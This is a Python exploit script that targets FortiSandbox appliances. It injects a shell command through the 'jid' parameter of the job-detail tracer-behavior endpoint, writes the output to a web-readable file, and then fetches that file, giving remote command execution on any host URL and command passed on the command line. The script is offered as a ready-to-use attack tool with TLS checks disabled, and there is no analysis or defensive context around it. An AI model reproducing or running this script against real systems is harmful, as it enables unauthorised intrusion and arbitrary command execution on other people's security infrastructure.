import requests
import sys
import urllib.parse
import argparse
from typing import Optional

requests.packages.urllib3.disable_warnings()

def exploit(host: str, command: str, verify: bool = False) -> bool:
    payload = f"|( {command} > /web/ng/out.txt )|"
    encoded_payload = urllib.parse.quote(payload)
    
    url = f"{host}/fortisandbox/job-detail/tracer-behavior"
    
    try:
        response = requests.get(
            url,
            params={"jid": payload},
            verify=verify,
            timeout=10
        )
        
        if response.status_code == 200:
            print(f"Command executed. Retrieving output from /web/ng/out.txt")
            return retrieve_output(host, verify)
        else:
            print(f"Failed. Status: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"Error: {e}")
        return False

def retrieve_output(host: str, verify: bool = False) -> bool:
    out_url = f"{host}/ng/out.txt"
    try:
        r = requests.get(out_url, verify=verify, timeout=10)
        if r.status_code == 200 and r.text.strip():
            print("Output:")
            print(r.text)
            return True
        else:
            print("No output or file not found.")
            return False
    except Exception as e:
        print(f"Failed to retrieve output: {e}")
        return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="Target url")
    parser.add_argument("-c", "--command", default="id", help="Command to run (default: id)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    args = parser.parse_args()
    
    host = args.host.rstrip("/")
    verify = not args.no_verify
        
    exploit(host, args.command, verify)

if __name__ == "__main__":
    main()